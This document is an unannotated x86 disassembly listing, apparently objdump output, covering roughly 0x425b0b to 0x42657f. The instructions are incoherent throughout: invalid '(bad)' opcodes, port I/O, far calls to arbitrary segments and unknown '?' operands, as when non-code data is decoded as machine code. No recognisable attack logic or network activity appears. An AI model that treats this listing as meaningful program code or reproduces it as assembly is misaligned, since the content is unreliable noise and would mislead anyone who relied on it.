  425b0b:	sti    
  425b0c:	call   0x169:0x969c0b83
  425b13:	jo     0x425b85
  425b15:	mov    dh,0x98
  425b17:	pop    esp
  425b18:	or     BYTE PTR [ebx-0x54],al
  425b1b:	jne    0x425aff
  425b1d:	fisub  DWORD PTR [ebp-0x7acbf64a]
  425b23:	cmp    eax,0x288f88ee
  425b28:	aas    
  425b29:	addr16 pop ss
  425b2b:	lahf   
  425b2c:	inc    ebx
  425b2d:	and    eax,0x823ac9ab
  425b32:	xchg   ecx,eax
  425b33:	sar    BYTE PTR [ecx-0x8],1
  425b36:	xchg   ch,al
  425b38:	sete   ah
  425b3b:	in     eax,0xe1
  425b3d:	cli    
  425b3e:	cs out 0x4f,eax
  425b41:	loopne 0x425b3b
  425b43:	push   0x48
  425b45:	in     al,0xc8
  425b47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b49:	mov    ebp,0xfdf547ab
  425b4e:	cmp    BYTE PTR [esi-0x12739de7],bh
  425b54:	js     0x425bcf
  425b56:	inc    ebp
  425b57:	retf   
  425b58:	daa    
  425b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b5a:	mov    al,ds:0xd93cadd0
  425b5f:	lahf   
  425b60:	in     eax,0xd3
  425b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b63:	push   edi
  425b64:	or     DWORD PTR [esi],edx
  425b66:	or     eax,0x822d7238
  425b6b:	adc    eax,0xcb404799
  425b70:	xchg   DWORD PTR [ecx+0x387aa28d],edx
  425b76:	ins    DWORD PTR es:[edi],dx
  425b77:	adc    eax,0x7bcca89f
  425b7c:	push   esp
  425b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b7e:	inc    ebp
  425b7f:	adc    DWORD PTR [eax-0x358cb364],ebx
  425b85:	push   ebx
  425b86:	xlat   BYTE PTR ds:[ebx]
  425b87:	call   0xdbc1:0xadd38712
  425b8e:	arpl   WORD PTR [esi+eiz*8+0x0],dx
	...
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	cmp    eax,0x92aad1a0
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0x13000001
  425c0d:	fucomi st,st(6)
  425c0f:	shl    BYTE PTR [eax-0x5d3d2875],0xd0
  425c16:	das    
  425c17:	pop    ss
  425c18:	inc    esp
  425c19:	cli    
  425c1a:	add    DWORD PTR [edx-0x53],ecx
  425c1d:	jmp    0x7751:0x961dd3dc
  425c24:	lods   eax,DWORD PTR ds:[esi]
  425c25:	add    ah,BYTE PTR [esi-0x7f]
  425c28:	xchg   ecx,eax
  425c29:	adc    al,BYTE PTR [ecx+0x61]
  425c2c:	outs   dx,BYTE PTR ds:[esi]
  425c2d:	ja     0x425c47
  425c2f:	pop    esi
  425c30:	js     0x425bb6
  425c32:	(bad)  
  425c33:	pop    esi
  425c34:	xor    ebp,DWORD PTR [edx]
  425c36:	cmp    eax,ebx
  425c38:	mov    BYTE PTR [esi],0x76
  425c3b:	stc    
  425c3c:	(bad)  
  425c3d:	bound  ebx,QWORD PTR [ecx+0x58]
  425c40:	jmp    0xfc80c0e7
  425c45:	cmp    BYTE PTR [eax-0x2f917d59],ah
  425c4b:	or     eax,0x3b1e9c98
  425c50:	push   ss
  425c51:	jno    0x425ca2
  425c53:	jmp    0x425c63
  425c55:	(bad)  
  425c57:	mov    ah,0x70
  425c59:	jmp    0x425bef
  425c5b:	outs   dx,BYTE PTR ds:[esi]
  425c5c:	mov    cl,0xb0
  425c5e:	iret   
  425c5f:	pop    ds
  425c60:	out    0x9,eax
  425c62:	mov    al,0xd5
  425c64:	add    BYTE PTR [edi],bh
  425c66:	and    DWORD PTR cs:[ebp-0x69],ecx
  425c6a:	call   0xbdb6150b
  425c6f:	imul   ebp,DWORD PTR [ecx+eiz*1+0x58],0xd2351eca
  425c77:	addr16 pop ebx
  425c79:	out    0xec,eax
  425c7b:	xlat   BYTE PTR ds:[ebx]
  425c7c:	bound  ecx,QWORD PTR [ecx]
  425c7e:	pop    ss
  425c7f:	mov    cl,0x5
  425c81:	or     DWORD PTR [ecx+0x36],0x10
  425c85:	jo     0x425c52
  425c87:	mov    ah,0xd
  425c89:	hlt    
  425c8a:	fdiv   DWORD PTR [esp+ebx*1+0xe66bee3]
  425c91:	xor    al,0xeb
  425c93:	or     eax,0xdb554637
  425c98:	mov    al,0x32
  425c9a:	or     eax,0xbe5c75c
  425c9f:	sbb    BYTE PTR [edi-0x47],0xbd
  425ca3:	(bad)  
  425ca4:	(bad)  
  425ca5:	popa   
  425ca6:	sbb    ebp,DWORD PTR [esi]
  425ca8:	nop
  425ca9:	push   edi
  425caa:	pop    edx
  425cab:	jmp    0x425ca8
  425cad:	nop
  425cae:	mov    ?,WORD PTR [ebx-0x5e]
  425cb1:	leave  
  425cb2:	xchg   ecx,eax
  425cb3:	popf   
  425cb4:	mov    edx,0x2ed6c48f
  425cb9:	div    cl
  425cbb:	push   ds
  425cbc:	fwait
  425cbd:	push   eax
  425cbe:	lods   al,BYTE PTR ds:[esi]
  425cbf:	loopne 0x425cca
  425cc1:	dec    edx
  425cc2:	push   edx
  425cc3:	mov    ds:0xe453b21d,al
  425cc8:	jno    0x425d14
  425cca:	push   0xffffffbf
  425ccc:	outs   dx,BYTE PTR ds:[esi]
  425ccd:	in     eax,0xd4
  425ccf:	inc    ebx
  425cd0:	enter  0x35ca,0x2d
  425cd4:	lea    ecx,[ebx]
  425cd6:	arpl   WORD PTR [ebx+0x71],bx
  425cd9:	jecxz  0x425d3e
  425cdb:	jge    0x425d34
  425cdd:	ja     0x425c8c
  425cdf:	call   0xedc2:0x88e723c6
  425ce6:	(bad)  
  425ce7:	loop   0x425d33
  425ce9:	and    bh,bh
  425ceb:	out    0x6c,al
  425ced:	jmp    DWORD PTR [esi+0x13e3b394]
  425cf3:	into   
  425cf4:	mov    ah,0x64
  425cf6:	stc    
  425cf7:	fist   DWORD PTR [ebp-0x73c15192]
  425cfd:	mov    ecx,0x51807f2e
  425d02:	mov    eax,ds:0xcd338a59
  425d07:	retf   0x545d
  425d0a:	sahf   
  425d0b:	push   ds
  425d0c:	sub    ch,BYTE PTR ds:0x3a17e9
	...
  425d72:	add    BYTE PTR [eax],al
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x554a74d0,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x7e000001
  425d8d:	shl    ebx,cl
  425d8f:	mov    al,0x8a
  425d91:	test   eax,0x2b011f28
  425d96:	inc    ebp
  425d97:	popa   
  425d98:	sbb    eax,0x4d6a612c
  425d9d:	sub    cl,BYTE PTR ds:0x35418ecb
  425da3:	or     eax,0x957d26d
  425da8:	pop    eax
  425da9:	fs dec ebx
  425dab:	cmp    ebx,DWORD PTR [esi+0x16]
  425dae:	aam    0x9a
  425db0:	mov    ch,0xfd
  425db2:	fdiv   st,st(2)
  425db4:	jnp    0x425db9
  425db6:	into   
  425db7:	mov    al,BYTE PTR [esi+0x4e]
  425dba:	adc    eax,0xb68a6ff4
  425dbf:	in     eax,dx
  425dc0:	and    ebx,DWORD PTR [edi-0x26]
  425dc3:	mov    es:0x4ad992a9,eax
  425dc9:	rcr    ah,0x94
  425dcc:	adc    BYTE PTR [ebx],ch
  425dce:	sbb    ebp,DWORD PTR [ecx]
  425dd0:	push   0x3fb20d4d
  425dd5:	or     ecx,esp
  425dd7:	sub    cl,bl
  425dd9:	jp     0x425dc2
  425ddb:	jecxz  0x425e40
  425ddd:	pop    ebx
  425dde:	shl    DWORD PTR [ebx-0x65],cl
  425de1:	in     al,dx
  425de2:	cmp    bh,BYTE PTR [ecx+0xd3bf164]
  425de8:	mov    esi,0x421fe140
  425ded:	pop    ebp
  425dee:	(bad)  
  425def:	push   ecx
  425df0:	rcr    edx,1
  425df2:	(bad)  
  425df3:	or     eax,0xa928334
  425df8:	into   
  425df9:	xor    BYTE PTR [ecx-0x76],0xb2
  425dfd:	pusha  
  425dfe:	imul   ecx,DWORD PTR [eax],0x77
  425e01:	xchg   edi,ebp
  425e03:	jmp    0x2421d837
  425e08:	and    cl,dl
  425e0a:	daa    
  425e0b:	out    dx,eax
  425e0c:	mov    DWORD PTR [ebp+0x6a822dcf],ebx
  425e12:	retf   0x4a84
  425e15:	fwait
  425e16:	int    0xa1
  425e18:	bound  esi,QWORD PTR [ebx+0x5]
  425e1b:	add    ah,BYTE PTR ds:[ebx+0x57]
  425e1f:	dec    eax
  425e20:	nop
  425e21:	je     0x425e6f
  425e23:	push   0x1e
  425e25:	repz pop ebx
  425e27:	mov    esi,0xb0a313ef
  425e2c:	lods   eax,DWORD PTR ds:[esi]
  425e2d:	mov    DWORD PTR [ecx],edi
  425e2f:	es lock xchg ecx,eax
  425e32:	or     dh,ah
  425e34:	mov    cl,BYTE PTR [eax]
  425e36:	mov    WORD PTR [esi-0x72],?
  425e39:	rcr    eax,1
  425e3b:	ins    DWORD PTR es:[edi],dx
  425e3c:	ret    0xbed6
  425e3f:	fnstsw WORD PTR [edx]
  425e41:	in     al,dx
  425e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e43:	adc    cl,ah
  425e45:	fsubr  st,st(4)
  425e47:	sub    eax,DWORD PTR [ebx-0x27]
  425e4a:	iret   
  425e4b:	mov    esi,0x953fd5d3
  425e50:	jnp    0x425e8d
  425e52:	jge    0x425ddf
  425e54:	lods   al,BYTE PTR ds:[esi]
  425e55:	cdq    
  425e56:	xchg   ecx,eax
  425e57:	int3   
  425e58:	and    cl,al
  425e5a:	inc    esp
  425e5b:	cmc    
  425e5c:	lds    esi,FWORD PTR ds:0xe9c95a67
  425e62:	leave  
  425e63:	scas   eax,DWORD PTR es:[edi]
  425e64:	inc    ebx
  425e65:	test   ah,cl
  425e67:	popf   
  425e68:	sbb    esp,DWORD PTR [ebp-0x580f2736]
  425e6e:	arpl   WORD PTR [esi-0x167765b1],bp
  425e74:	mov    ecx,DWORD PTR [eax+0x38]
  425e77:	in     al,dx
  425e78:	push   0x818260e9
  425e7d:	hlt    
  425e7e:	mov    al,0xf5
  425e80:	es sub eax,0x3696bf9d
  425e86:	test   eax,0x2348d3bd
  425e8b:	add    BYTE PTR [ebx-0x1e],ah
  425e8e:	add    esp,edx
  425e90:	adc    eax,DWORD PTR [eax]
	...
  425ef2:	add    BYTE PTR [eax],al
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	sub    DWORD PTR [esi],ebx
  425f02:	and    dl,BYTE PTR [esp+ebx*4]
  425f05:	xchg   ebp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0xa7000001
  425f0d:	and    ah,BYTE PTR [edi+0x4514a841]
  425f13:	sti    
  425f14:	mov    ecx,0x6c7110ad
  425f19:	sti    
  425f1a:	leave  
  425f1b:	and    al,0x25
  425f1d:	sbb    edx,DWORD PTR gs:[edx-0x4d657aaa]
  425f24:	sbb    BYTE PTR [ebx-0x13],dl
  425f27:	leave  
  425f28:	mov    ebp,0xc25c78b7
  425f2d:	pop    esi
  425f2e:	test   BYTE PTR [ebx-0x3b558ee4],0x40
  425f35:	add    al,0xea
  425f37:	xchg   BYTE PTR [esi-0x4b0ee00],bl
  425f3d:	ret    0xd371
  425f40:	push   cs
  425f41:	pop    ecx
  425f42:	mov    edx,0xd3748885
  425f47:	call   0x5a10d63d
  425f4c:	test   BYTE PTR [edi],bl
  425f4e:	cmp    eax,0xdbbd75e3
  425f53:	mov    cs,WORD PTR [edi]
  425f55:	lahf   
  425f56:	mov    bh,0x31
  425f58:	and    bh,al
  425f5a:	cmp    ah,BYTE PTR [edi-0x29]
  425f5d:	mov    ah,BYTE PTR [ebx-0x5c]
  425f60:	es (bad) 
  425f63:	dec    edx
  425f64:	pop    esi
  425f65:	dec    esi
  425f66:	push   esi
  425f67:	xchg   esi,eax
  425f68:	outs   dx,BYTE PTR ds:[esi]
  425f69:	xchg   esi,eax
  425f6a:	shl    dl,1
  425f6c:	js     0x425f1a
  425f6e:	push   0x29
  425f70:	dec    esp
  425f71:	or     ebp,DWORD PTR gs:[edi-0x417d0ff0]
  425f78:	stc    
  425f79:	outs   dx,DWORD PTR ds:[esi]
  425f7a:	fcom   DWORD PTR [esi+0x62]
  425f7d:	scas   eax,DWORD PTR es:[edi]
  425f7e:	cmp    eax,0xdbe62434
  425f83:	pop    ss
  425f84:	in     al,0xc7
  425f86:	jnp    0x425f24
  425f88:	js     0x425f45
  425f8a:	jo     0x425f83
  425f8c:	dec    ebp
  425f8d:	mov    ebp,0xe36ab8
  425f92:	cwde   
  425f93:	mov    ds:0x39292243,al
  425f98:	jp     0x425f2a
  425f9a:	lods   al,BYTE PTR ds:[esi]
  425f9b:	add    BYTE PTR [edi+0x20],0xba
  425f9f:	repnz repnz call 0x6d38:0xb1645283
  425fa8:	xchg   edi,eax
  425fa9:	iret   
  425faa:	mov    esi,0x1ff04ed7
  425faf:	pop    eax
  425fb0:	fldenv [ebx]
  425fb2:	popa   
  425fb3:	mov    ds:0x77b7cf10,eax
  425fb8:	jmp    0x42602c
  425fba:	dec    edx
  425fbb:	loop   0x425f6e
  425fbd:	dec    edi
  425fbe:	rcr    BYTE PTR [ebx-0x6209a0bb],cl
  425fc4:	mov    bh,0xa4
  425fc6:	mov    ebx,DWORD PTR [ebx-0x5c]
  425fc9:	mov    ebx,ecx
  425fcb:	aam    0x5d
  425fcd:	mov    al,0xaa
  425fcf:	fbstp  TBYTE PTR [ebx-0x18]
  425fd2:	mov    edi,0xe52536c4
  425fd7:	(bad)  
  425fd8:	jno    0x42600b
  425fda:	je     0x426049
  425fdc:	cmp    esp,edi
  425fde:	mov    ds:0x7afc0ec4,eax
  425fe3:	pop    edx
  425fe4:	or     eax,0xc711d46e
  425fe9:	and    BYTE PTR [ebx],ah
  425feb:	iret   
  425fec:	add    ecx,0x4aaa399d
  425ff2:	fsub   DWORD PTR [edi+0x2d72cf4e]
  425ff8:	xchg   esi,eax
  425ff9:	mov    ch,0x68
  425ffb:	test   al,0xe3
  425ffd:	mov    cl,BYTE PTR [ebp+0x6]
  426000:	test   DWORD PTR [esi+0x57],ecx
  426003:	inc    eax
  426004:	and    eax,0x27
  426007:	jo     0x425f97
  426009:	retf   
  42600a:	pop    ds
  42600b:	nop
  42600c:	add    eax,0x81e1f629
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	cmp    al,0xf1
  426082:	push   ebx
  426083:	sbb    al,0xa1
  426085:	xchg   esi,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    eax,0xa2000001
  42608d:	ret    
  42608e:	stc    
  42608f:	cld    
  426090:	cvtpi2ps xmm0,QWORD PTR [esi+0x19]
  426094:	cld    
  426095:	pop    ecx
  426096:	mov    ah,0x75
  426098:	adc    eax,0xccbad48e
  42609d:	and    BYTE PTR ds:0x953eec2,bh
  4260a3:	mov    esi,0x5b789305
  4260a8:	or     BYTE PTR [ecx],0x95
  4260ab:	mov    al,0x14
  4260ad:	jp     0x42604e
  4260af:	mov    ebx,0x8d8695ab
  4260b4:	stos   BYTE PTR es:[edi],al
  4260b5:	test   BYTE PTR [edx],ah
  4260b7:	and    al,0x12
  4260b9:	in     al,dx
  4260ba:	or     ecx,DWORD PTR ds:0x3e0111d
  4260c0:	hlt    
  4260c1:	into   
  4260c2:	mov    dl,0x32
  4260c4:	cmp    ch,BYTE PTR [edi+0x6a3f33f9]
  4260ca:	popa   
  4260cb:	ftst   
  4260cd:	mov    edx,0x4cffa26
  4260d2:	mov    ch,0x82
  4260d4:	xor    BYTE PTR [edx],al
  4260d6:	neg    ebx
  4260d8:	and    al,0xa8
  4260da:	mov    bh,0x25
  4260dc:	das    
  4260dd:	pushf  
  4260de:	(bad)  
  4260df:	sbb    DWORD PTR [edx],ebp
  4260e1:	sub    al,0x18
  4260e3:	and    eax,0x75aeb0ca
  4260e8:	fwait
  4260e9:	(bad)  
  4260ea:	fstp   QWORD PTR [ebx+0x7b]
  4260ed:	sub    eax,0xdcb93627
  4260f2:	nop
  4260f3:	xor    DWORD PTR [eax-0x60],eax
  4260f6:	adc    DWORD PTR [esp+ebx*8],0xffffffd4
  4260fa:	outs   dx,DWORD PTR cs:[esi]
  4260fc:	sub    ecx,DWORD PTR [esi-0x56]
  4260ff:	fwait
  426100:	ja     0x4260c2
  426102:	add    al,0x61
  426104:	jno    0x426171
  426106:	(bad)  
  426107:	out    dx,al
  426108:	add    BYTE PTR [edx+0x7c],ah
  42610b:	cwde   
  42610c:	mov    ch,0x1f
  42610e:	mov    ch,0x20
  426110:	(bad)
  426114:	pop    ds
  426115:	outs   dx,BYTE PTR ds:[esi]
  426116:	jns    0x4260ad
  426118:	push   ebp
  426119:	and    eax,0xc6663b91
  42611e:	push   es
  42611f:	push   0x4fa71408
  426124:	pop    esi
  426125:	lds    edi,FWORD PTR [ecx+0x2e12380b]
  42612b:	push   ecx
  42612c:	mov    DWORD PTR [ebp+ebx*1+0x366a321c],edx
  426133:	add    bl,BYTE PTR [edi-0x651e527b]
  426139:	sti    
  42613a:	xlat   BYTE PTR ds:[ebx]
  42613b:	out    0xa,eax
  42613d:	loope  0x4261a7
  42613f:	cwde   
  426140:	(bad)  
  426141:	adc    al,BYTE PTR [edx-0x2245a2c2]
  426147:	pop    eax
  426148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426149:	and    al,0x41
  42614b:	add    eax,0xc6024b51
  426150:	add    BYTE PTR [ebp-0x5f3f4fc9],al
  426156:	xor    ah,BYTE PTR [edx+0x28]
  426159:	stc    
  42615a:	jbe    0x426146
  42615c:	es or  eax,0x44f982c6
  426162:	or     BYTE PTR [edi],dl
  426164:	call   ebp
  426166:	mov    ah,BYTE PTR [edi+ebx*1-0x6a]
  42616a:	mov    ss,esi
  42616c:	sub    ebp,DWORD PTR [edx-0x54]
  42616f:	ss pop ss
  426171:	retf   
  426172:	das    
  426173:	daa    
  426174:	xchg   ebx,eax
  426175:	test   BYTE PTR [ecx-0x7c],bl
  426178:	pop    ds
  426179:	clc    
  42617a:	fimul  DWORD PTR [eax-0x4b]
  42617d:	outs   dx,BYTE PTR ds:[esi]
  42617e:	das    
  42617f:	inc    ebx
  426180:	cdq    
  426181:	and    bh,dl
  426183:	cdq    
  426184:	adc    bl,ah
  426186:	mov    ds:0x7faa7f3d,al
  42618b:	sbb    BYTE PTR [ecx+esi*4+0x6859aa],ah
	...
  4261f2:	add    BYTE PTR [eax],al
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx-0x5faf9cd9],0xfffffffc
  426204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0x21000001
  42620d:	(bad)  
  42620e:	sbb    ah,cl
  426210:	pop    ss
  426211:	and    eax,0x3851ccd2
  426216:	mov    bh,0x1d
  426218:	lahf   
  426219:	icebp  
  42621a:	adc    bh,0x87
  42621d:	inc    esp
  42621e:	or     DWORD PTR [eax+0x1765133a],eax
  426224:	ror    BYTE PTR [edx],1
  426226:	xchg   ebp,eax
  426227:	mov    dh,0x84
  426229:	and    DWORD PTR [esi+0x9],eax
  42622c:	imul   edx,DWORD PTR [edx],0x21
  42622f:	pop    ecx
  426230:	std    
  426231:	js     0x42621f
  426233:	int    0x91
  426235:	fcmovnbe st,st(7)
  426237:	lods   eax,DWORD PTR ds:[esi]
  426238:	mov    dh,0x96
  42623a:	mov    cs,WORD PTR [edi+eiz*4-0x3e]
  42623e:	xchg   esp,eax
  42623f:	dec    ecx
  426240:	bound  ecx,QWORD PTR [ebx+esi*2+0x56]
  426244:	(bad)  
  426245:	arpl   WORD PTR [eax],bp
  426247:	enter  0xac8d,0x40
  42624b:	icebp  
  42624c:	inc    ecx
  42624d:	fistp  DWORD PTR [ebp-0x5e]
  426250:	mov    eax,0xd0fb3efc
  426255:	jbe    0x42624f
  426257:	sbb    DWORD PTR [eax-0x37e519f2],ecx
  42625d:	push   ds
  42625e:	mov    ah,0x12
  426260:	shl    DWORD PTR [edx],1
  426262:	ss cmp eax,0x163302ed
  426268:	and    al,0xcd
  42626a:	dec    ebp
  42626b:	adc    BYTE PTR [edi+0x31640111],bh
  426271:	and    BYTE PTR ss:[edi],0x83
  426275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426276:	rol    esp,cl
  426278:	sub    ebx,edx
  42627a:	pop    esi
  42627b:	jb     0x4262de
  42627d:	dec    esp
  42627e:	ret    
  42627f:	push   eax
  426280:	push   edi
  426281:	xchg   esi,eax
  426282:	cmp    DWORD PTR [ebx+0x56231a28],edx
  426288:	repnz test eax,0x44d235b7
  42628e:	ficom  DWORD PTR [edi-0x6683e611]
  426294:	hlt    
  426295:	mov    bl,0xbf
  426297:	xchg   ebx,eax
  426298:	mov    ebx,0xe7a5ad99
  42629d:	push   ds
  42629e:	(bad)  
  42629f:	out    0x6f,al
  4262a1:	jmp    0x501a68dc
  4262a6:	pop    ss
  4262a7:	fxch   st(2)
  4262a9:	push   ss
  4262aa:	mov    ds,WORD PTR [eax-0x4f03edfe]
  4262b0:	nop
  4262b1:	into   
  4262b2:	jo     0x4262c1
  4262b4:	mov    cl,0xa0
  4262b6:	leave  
  4262b7:	adc    ch,BYTE PTR [ecx]
  4262b9:	and    bh,al
  4262bb:	xchg   esp,eax
  4262bc:	or     eax,0xd1775877
  4262c1:	inc    edx
  4262c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262c3:	push   cs
  4262c4:	sbb    ch,bh
  4262c6:	cmc    
  4262c7:	stc    
  4262c8:	cmp    BYTE PTR [edi],ah
  4262ca:	out    dx,al
  4262cb:	jnp    0x4262bb
  4262cd:	push   0xffffffe8
  4262cf:	mov    ebx,esi
  4262d1:	cmc    
  4262d2:	xor    ch,cl
  4262d4:	out    0xf,al
  4262d6:	push   edx
  4262d7:	test   al,0x5
  4262d9:	xor    BYTE PTR [edx],cl
  4262db:	pop    ss
  4262dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262dd:	ror    DWORD PTR [ecx],0xa2
  4262e0:	jns    0x4262a4
  4262e2:	mov    al,ds:0x584802b
  4262e7:	dec    edi
  4262e8:	call   0x5356:0x87bcebfa
  4262ef:	adc    al,0x8c
  4262f1:	imul   ecx,DWORD PTR [ecx-0x35ee21bb],0x1b048b1a
  4262fb:	ds or  edi,ebx
  4262fe:	mov    dh,0x28
  426300:	jge    0x4262bb
  426302:	bnd jmp 0x426289
  426305:	enter  0x1293,0x91
  426309:	sub    bh,bh
  42630b:	loope  0x42636a
  42630d:	xchg   BYTE PTR [edx+0xb14f],al
	...
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xb152c2f4
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0xe3000001
  42638d:	iret   
  42638e:	cmp    eax,0x2225fb5
  426393:	mov    esi,DWORD PTR [esi+0x54]
  426396:	mov    ebx,0x86f9a32e
  42639b:	xchg   BYTE PTR [ebp+0x7d],bh
  42639e:	pop    ebx
  42639f:	mov    ebx,ds
  4263a1:	lahf   
  4263a2:	push   ds
  4263a3:	mov    ecx,DWORD PTR [eax+0xd]
  4263a6:	out    0x45,al
  4263a8:	cmp    al,0x48
  4263aa:	sbb    bh,BYTE PTR [ebx-0x6]
  4263ad:	and    BYTE PTR [ecx+0x3229023b],0xe6
  4263b4:	enter  0xfc5a,0xb3
  4263b8:	pop    ebx
  4263b9:	mov    cs,WORD PTR [eax+ecx*1]
  4263bc:	pop    ecx
  4263bd:	or     edx,DWORD PTR [esi-0x2c]
  4263c0:	and    edi,ecx
  4263c2:	int    0x30
  4263c4:	les    esi,FWORD PTR [edx-0x2695d6a6]
  4263ca:	xor    al,0x44
  4263cc:	call   0x3cd09e24
  4263d1:	add    DWORD PTR [ebx+eiz*8],ebx
  4263d4:	call   0x3e40:0x1b086926
  4263db:	jb     0x426416
  4263dd:	pop    esp
  4263de:	aad    0x54
  4263e0:	jmp    0xa28:0x8a2770c4
  4263e7:	xor    DWORD PTR [edx+0x50],ebx
  4263ea:	cmp    eax,0xe135c62e
  4263ef:	dec    edx
  4263f0:	dec    eax
  4263f1:	mov    dl,0x4c
  4263f3:	shr    BYTE PTR [edi+0x7a07262],cl
  4263f9:	push   esi
  4263fa:	push   eax
  4263fb:	xchg   dl,cl
  4263fd:	xchg   ebp,eax
  4263fe:	nop
  4263ff:	ins    BYTE PTR es:[edi],dx
  426400:	add    eax,DWORD PTR [esi+0x74]
  426403:	sbb    esi,DWORD PTR [edx+eiz*8+0x3a]
  426407:	or     ecx,ecx
  426409:	cmp    al,BYTE PTR [edi-0x6]
  42640c:	dec    ecx
  42640d:	pop    edi
  42640e:	cmp    ebx,DWORD PTR [ebp-0x76d7d9c3]
  426414:	cmp    al,0x8e
  426416:	test   esi,edi
  426418:	das    
  426419:	xor    cl,BYTE PTR [esi+0x4600848b]
  42641f:	sbb    al,0xec
  426421:	imul   ebp,esi,0x34e503e3
  426427:	out    dx,al
  426428:	pop    edi
  426429:	mov    DWORD PTR [ebp+0x5e],esi
  42642c:	push   0x9b3dbaff
  426431:	push   edi
  426432:	xor    eax,0x52690c9
  426437:	push   esp
  426438:	ss sub eax,0x86a0326c
  42643e:	scas   eax,DWORD PTR es:[edi]
  42643f:	mov    bl,0xbc
  426441:	mov    eax,0x1900761a
  426446:	test   DWORD PTR [ebx],edx
  426448:	xor    eax,0x1fcfadeb
  42644d:	daa    
  42644e:	fiadd  WORD PTR [ecx]
  426450:	add    al,0xea
  426452:	fld    TBYTE PTR [ecx-0x3c]
  426455:	sbb    bh,BYTE PTR [esi-0x46]
  426458:	pop    es
  426459:	xchg   ebp,eax
  42645a:	lods   al,BYTE PTR ds:[esi]
  42645b:	jbe    0x4264c3
  42645d:	sub    al,0x19
  42645f:	hlt    
  426460:	fldenv [edi-0x417b0b6d]
  426466:	lods   eax,DWORD PTR ds:[esi]
  426467:	std    
  426468:	inc    ebp
  426469:	daa    
  42646a:	dec    esi
  42646b:	sti    
  42646c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42646d:	adc    BYTE PTR [esp+ebp*2-0xa],bl
  426471:	(bad)  
  426472:	mov    ebx,0xf4bf6cb5
  426477:	imul   DWORD PTR [ecx-0x36f8a430]
  42647d:	mov    bl,0x73
  42647f:	sub    BYTE PTR [ebx-0x29],bh
  426482:	(bad)  
  426483:	shr    DWORD PTR [ebx],1
  426485:	pop    eax
  426486:	inc    esi
  426487:	retf   0xad97
  42648a:	mov    bh,0x4
  42648c:	push   esp
  42648d:	mov    ds,ebx
  42648f:	enter  0xa4,0x0
	...
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [ebx-0x4f16dea7],ebp
  426505:	cdq    
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0x98000001
  42650d:	(bad)  
  42650f:	call   0x2a9e:0x6465be95
  426516:	imul   BYTE PTR [edx+0x7c787450]
  42651c:	and    BYTE PTR [ebp+esi*2-0x10d42b3b],bh
  426523:	pop    ds
  426524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426525:	jnp    0x426567
  426527:	jb     0x42656a
  426529:	sub    DWORD PTR [ecx+ebx*4],ebx
  42652c:	or     esi,DWORD PTR [esi+0x618ba085]
  426532:	push   0x6a2a96d7
  426537:	mov    al,ds:0xb75065cc
  42653c:	or     al,0x80
  42653e:	dec    ebx
  42653f:	push   edx
  426540:	jne    0x42653f
  426542:	bnd jae 0x42651f
  426545:	sub    al,ch
  426547:	and    eax,0xcd7d6cda
  42654c:	xchg   esi,eax
  42654d:	jno    0x4265a7
  42654f:	(bad)  
  426550:	mov    bl,0x5
  426552:	call   0xe0e1:0x8d538451
  426559:	fs sub eax,0x3671c0d3
  42655f:	jmp    0x14c6:0x54ba70c6
  426566:	test   DWORD PTR ds:0x10fb9f08,ebx
  42656c:	mov    bl,0x67
  42656e:	pop    edx
  42656f:	call   0xee9d7cea
  426574:	imul   BYTE PTR [edi]
  426576:	add    al,BYTE PTR [esp+edx*1]
  426579:	pop    edx
  42657a:	mov    al,ch
  42657c:	or     al,0x46
  42657e:	leave  
  42657f:	push   ds
